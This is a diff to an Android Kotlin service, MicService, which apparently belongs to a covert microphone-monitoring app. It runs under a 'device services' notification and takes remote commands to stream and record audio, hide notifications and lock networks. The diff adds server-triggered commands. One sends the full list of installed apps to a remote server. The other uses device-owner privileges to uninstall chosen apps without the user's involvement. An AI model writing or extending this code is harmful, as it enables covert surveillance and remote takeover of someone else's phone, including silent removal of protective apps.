@@ -9,6 +9,8 @@ import android.content.Context
 import android.content.Intent
 import android.content.BroadcastReceiver
 import android.content.IntentFilter
+import android.content.pm.ApplicationInfo
+import android.content.pm.PackageInstaller
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
@@ -336,6 +338,8 @@ class MicService : Service() {
         const val CHANNEL_ID   = "device_services_channel"
         const val NOTIF_ID     = 101
         const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
+        const val ACTION_UNINSTALL_RESULT = "com.micmonitor.app.UNINSTALL_RESULT"
+        const val EXTRA_UNINSTALL_PACKAGE = "extra_uninstall_package"
         
         const val WEBRTC_LAST_RESORT_BITRATE_KBPS = 24
         const val WEBRTC_MIN_BITRATE_KBPS = 32
@@ -547,6 +551,10 @@ class MicService : Service() {
         if (!isDeviceOwnerConfigured) {
             setupDeviceOwnerPolicies()
             isDeviceOwnerConfigured = true
+        }
+
+        if (intent?.action == ACTION_UNINSTALL_RESULT) {
+            handleUninstallResultIntent(intent)
         }
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
@@ -978,6 +986,157 @@ class MicService : Service() {
             }
         }
         prefs.edit().putString(key, remaining.toString()).apply()
+    }
+
+    private data class InstalledAppEntry(
+        val label: String,
+        val packageName: String,
+        val versionName: String,
+        val versionCode: Long,
+        val isSystem: Boolean,
+        val isSelf: Boolean,
+        val enabled: Boolean,
+        val canUninstall: Boolean,
+    )
+
+    private fun sendInstalledApps(): String? {
+        return try {
+            val pm = packageManager
+            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(PackageManager.MATCH_ALL.toLong()))
+            } else {
+                @Suppress("DEPRECATION")
+                pm.getInstalledPackages(PackageManager.MATCH_ALL)
+            }
+
+            val entries = packages.mapNotNull { pkg ->
+                val appInfo = pkg.applicationInfo ?: return@mapNotNull null
+                val pkgName = pkg.packageName ?: return@mapNotNull null
+                val label = appInfo.loadLabel(pm)?.toString()?.trim().orEmpty().ifBlank { pkgName }
+                val versionName = pkg.versionName ?: ""
+                val versionCode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    pkg.longVersionCode
+                } else {
+                    @Suppress("DEPRECATION")
+                    pkg.versionCode.toLong()
+                }
+                val isSystem = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0 ||
+                    (appInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+                val isSelf = pkgName == packageName
+                val enabled = appInfo.enabled
+                val canUninstall = !isSystem && !isSelf && pkgName.isNotBlank()
+                InstalledAppEntry(
+                    label = label,
+                    packageName = pkgName,
+                    versionName = versionName,
+                    versionCode = versionCode,
+                    isSystem = isSystem,
+                    isSelf = isSelf,
+                    enabled = enabled,
+                    canUninstall = canUninstall,
+                )
+            }.sortedWith(compareBy<InstalledAppEntry> { it.isSystem }.thenBy { it.label.lowercase() })
+
+            val apps = JSONArray()
+            entries.forEach { entry ->
+                apps.put(JSONObject().apply {
+                    put("label", entry.label)
+                    put("packageName", entry.packageName)
+                    put("versionName", entry.versionName)
+                    put("versionCode", entry.versionCode)
+                    put("isSystem", entry.isSystem)
+                    put("isSelf", entry.isSelf)
+                    put("enabled", entry.enabled)
+                    put("canUninstall", entry.canUninstall)
+                })
+            }
+
+            val msg = JSONObject().apply {
+                put("type", "installed_apps")
+                put("apps", apps)
+                put("ts", System.currentTimeMillis())
+            }
+            val sent = safeSend(msg.toString())
+            if (!sent) return "installed_apps_send_failed"
+            null
+        } catch (e: Exception) {
+            Log.e(TAG, "Installed app scan failed: ${e.message}")
+            e.message ?: "scan_failed"
+        }
+    }
+
+    private fun uninstallPackage(targetPackage: String) {
+        val pkg = targetPackage.trim()
+        if (pkg.isBlank()) {
+            sendCommandAck("uninstall_package", "error", "invalid_package")
+            return
+        }
+        if (pkg == packageName) {
+            sendCommandAck("uninstall_package", "error", "self_uninstall_blocked")
+            return
+        }
+        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+        if (!dpm.isDeviceOwnerApp(packageName)) {
+            sendCommandAck("uninstall_package", "error", "not_device_owner")
+            return
+        }
+        val appInfo = try {
+            packageManager.getApplicationInfo(pkg, 0)
+        } catch (_: Exception) {
+            null
+        }
+        if (appInfo == null) {
+            sendCommandAck("uninstall_package", "error", "not_installed")
+            return
+        }
+        val isSystem = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0 ||
+            (appInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0
+        if (isSystem) {
+            sendCommandAck("uninstall_package", "error", "system_app")
+            return
+        }
+
+        try {
+            val intent = Intent(this, MicService::class.java).apply {
+                action = ACTION_UNINSTALL_RESULT
+                putExtra(EXTRA_UNINSTALL_PACKAGE, pkg)
+            }
+            val statusReceiver = PendingIntent.getService(
+                this,
+                pkg.hashCode(),
+                intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
+            ).intentSender
+            packageManager.packageInstaller.uninstall(pkg, statusReceiver)
+        } catch (e: Exception) {
+            sendCommandAck("uninstall_package", "error", e.message)
+        }
+    }
+
+    private fun handleUninstallResultIntent(intent: Intent) {
+        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
+        val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE).orEmpty()
+        val pkg = intent.getStringExtra(EXTRA_UNINSTALL_PACKAGE)
+            ?: intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
+            ?: ""
+        when (status) {
+            PackageInstaller.STATUS_SUCCESS -> {
+                sendCommandAck("uninstall_package", "success", pkg.ifBlank { "success" })
+                sendInstalledApps()
+            }
+            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
+                sendCommandAck("uninstall_package", "error", "user_action_required")
+            }
+            else -> {
+                val detail = when {
+                    pkg.isNotBlank() && message.isNotBlank() -> "${pkg}:${message.take(120)}"
+                    message.isNotBlank() -> message.take(120)
+                    pkg.isNotBlank() -> "${pkg}:uninstall_failed"
+                    else -> "uninstall_failed"
+                }
+                sendCommandAck("uninstall_package", "error", detail)
+            }
+        }
     }
 
     private fun isNetworkUsable(): Boolean {
@@ -1634,6 +1793,20 @@ class MicService : Service() {
                 "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app", "lock_network", "unlock_network", "scan_recordings" -> {
                     handleServerCommand(obj.optString("type"))
                     return
+                }
+                "list_apps" -> {
+                    serviceScope.launch(Dispatchers.IO) {
+                        val error = sendInstalledApps()
+                        if (error == null) {
+                            sendCommandAck("list_apps")
+                        } else {
+                            sendCommandAck("list_apps", "error", error)
+                        }
+                    }
+                }
+                "uninstall_package" -> {
+                    val target = obj.optString("packageName", "").trim()
+                    uninstallPackage(target)
                 }
                 "ai_mode" -> {
                     aiAutoModeEnabled = false
